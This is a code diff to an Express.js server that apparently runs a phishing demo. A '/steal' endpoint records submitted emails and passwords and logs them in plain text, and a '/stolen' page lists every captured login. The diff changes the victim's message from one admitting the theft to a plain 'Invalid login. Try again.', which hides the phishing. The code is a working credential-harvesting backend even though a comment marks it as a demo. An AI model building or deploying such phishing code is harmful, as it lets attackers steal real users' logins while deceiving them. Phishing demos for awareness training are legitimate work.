@@ -247,19 +247,19 @@ app.post("/steal", (req, res) => {
   const { email, password } = req.body;
   phishedCreds.push({ email, password, time: new Date().toISOString() });
   console.log("⚠️ Phished credentials:", email, password);
-  res.send(
-    "❌ Invalid login. Meanwhile, attacker stole your credentials. <a href='/'>Home</a>"
-  );
+  res.send("❌ Invalid login. Try again. <a href='/'>Home</a>");
 });
 
-// Admin endpoint to view stolen creds
+// Show stolen credentials (for demo only!)
 app.get("/stolen", (req, res) => {
-  const list = stolenCreds
+  const list = phishedCreds
     .map((c) => `<li>${c.email} / ${c.password} (${c.time})</li>`)
     .join("");
-  res.send(
-    `<h1>Stolen Credentials</h1><ul>${list || "<li>None yet</li>"}</ul>`
-  );
+  res.send(`
+    <h1>⚠️ Stolen Credentials</h1>
+    <ul>${list || "<li>None yet</li>"}</ul>
+    <a href="/">Home</a>
+  `);
 });
 
 // Start server
